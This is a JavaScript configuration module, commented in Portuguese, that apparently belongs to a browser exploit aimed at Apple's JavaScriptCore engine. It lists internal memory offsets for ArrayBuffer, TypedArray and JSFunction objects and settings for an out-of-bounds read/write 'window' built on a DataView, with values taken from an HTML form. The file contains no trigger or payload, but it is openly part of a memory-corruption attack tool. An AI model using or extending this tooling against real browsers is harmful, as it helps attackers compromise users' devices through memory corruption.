// js/config.mjs

// Offsets para estruturas do JavaScriptCore (JSC)
export const JSC_OFFSETS = {
    ArrayBuffer: { // Estes são placeholders, podem precisar de confirmação para a versão alvo
        PTR_INTERNAL_STRUCT_OFFSET: 0x20,
        BYTELENGTH_IN_STRUCT_OFFSET: 0x20
    },
    TypedArray: { // Usados extensivamente
        M_VECTOR_OFFSET: 0x10,         // Ponteiro para os dados do buffer
        M_LENGTH_OFFSET: 0x18,         // Número de elementos
        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 // Ponteiro para o ArrayBuffer associado (se houver)
    },
    JSFunction: { // Para exploração mais avançada de funções
        M_EXECUTABLE_OFFSET: 0x18
    }
};

// Configurações Padrão do Exploit (podem ser lidas dos inputs do HTML)
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 288,    // Tamanho do oob_array_buffer_real e do victim_object
    BASE_OFFSET_IN_DV: 128,  // Offset base dentro do DataView para o início da "janela OOB"
    INITIAL_BUFFER_SIZE: 32  // Tamanho do buffer "antes" da área OOB, usado para calcular offsets relativos
};

export function updateOOBConfigFromUI() {
    const oobAllocSizeEl = document.getElementById('oobAllocSize');
    const baseOffsetEl = document.getElementById('baseOffset');
    const initialBufSizeEl = document.getElementById('initialBufSize');

    if (oobAllocSizeEl) OOB_CONFIG.ALLOCATION_SIZE = parseInt(oobAllocSizeEl.value) || OOB_CONFIG.ALLOCATION_SIZE;
    if (baseOffsetEl) OOB_CONFIG.BASE_OFFSET_IN_DV = parseInt(baseOffsetEl.value) || OOB_CONFIG.BASE_OFFSET_IN_DV;
    if (initialBufSizeEl) OOB_CONFIG.INITIAL_BUFFER_SIZE = parseInt(initialBufSizeEl.value) || OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

// Chamado para garantir que as configs são lidas da UI no início
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', updateOOBConfigFromUI);
} else {
    updateOOBConfigFromUI(); // Já carregado
}
